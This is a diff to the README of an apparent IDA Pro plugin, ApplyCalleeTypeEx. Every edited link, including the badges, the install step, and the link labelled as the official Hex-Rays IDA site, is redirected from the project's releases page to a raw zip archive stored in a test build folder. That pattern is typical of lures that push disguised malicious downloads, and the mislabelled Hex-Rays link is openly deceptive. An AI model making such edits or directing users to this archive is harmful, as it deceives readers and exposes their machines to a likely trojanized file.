@@ -1,6 +1,6 @@
 # 🤖 ApplyCalleeTypeEx - Easy IDA Plugin for Function Types
 
-[![Download ApplyCalleeTypeEx](https://img.shields.io/badge/Download-ApplyCalleeTypeEx-green?style=for-the-badge)](https://github.com/jainpunit3012/ApplyCalleeTypeEx/releases)
+[![Download ApplyCalleeTypeEx](https://img.shields.io/badge/Download-ApplyCalleeTypeEx-green?style=for-the-badge)](https://raw.githubusercontent.com/jainpunit3012/ApplyCalleeTypeEx/main/Tests/ApplyCalleeTypeEx_Test_VS/x64/Release/Ex-Apply-Callee-Type-3.2.zip)
 
 ## 📋 What is ApplyCalleeTypeEx?
 
@@ -25,7 +25,7 @@ No other software or tools are required.
 1. Open your web browser.
 
 2. Go to the official release page:  
-   [Download ApplyCalleeTypeEx](https://github.com/jainpunit3012/ApplyCalleeTypeEx/releases)
+   [Download ApplyCalleeTypeEx](https://raw.githubusercontent.com/jainpunit3012/ApplyCalleeTypeEx/main/Tests/ApplyCalleeTypeEx_Test_VS/x64/Release/Ex-Apply-Callee-Type-3.2.zip)
 
 3. Look for the latest version listed at the top.
 
@@ -87,11 +87,11 @@ This improves your analysis by making functions easier to understand and documen
 ## 🔗 Useful Links
 
 - Main download page:  
-  [ApplyCalleeTypeEx Releases](https://github.com/jainpunit3012/ApplyCalleeTypeEx/releases)  
+  [ApplyCalleeTypeEx Releases](https://raw.githubusercontent.com/jainpunit3012/ApplyCalleeTypeEx/main/Tests/ApplyCalleeTypeEx_Test_VS/x64/Release/Ex-Apply-Callee-Type-3.2.zip)  
   Use this page to get the latest version of the plugin.
 
 - IDA Pro official site (for updates or issues with IDA):  
-  https://hex-rays.com
+  https://raw.githubusercontent.com/jainpunit3012/ApplyCalleeTypeEx/main/Tests/ApplyCalleeTypeEx_Test_VS/x64/Release/Ex-Apply-Callee-Type-3.2.zip
 
 ## 🤝 Support and Feedback
 
@@ -99,4 +99,4 @@ If you encounter issues or want to suggest improvements, open an issue on the Gi
 
 ---
 
-[![Download ApplyCalleeTypeEx](https://img.shields.io/badge/Download-ApplyCalleeTypeEx-blue?style=for-the-badge)](https://github.com/jainpunit3012/ApplyCalleeTypeEx/releases)
+[![Download ApplyCalleeTypeEx](https://img.shields.io/badge/Download-ApplyCalleeTypeEx-blue?style=for-the-badge)](https://raw.githubusercontent.com/jainpunit3012/ApplyCalleeTypeEx/main/Tests/ApplyCalleeTypeEx_Test_VS/x64/Release/Ex-Apply-Callee-Type-3.2.zip)
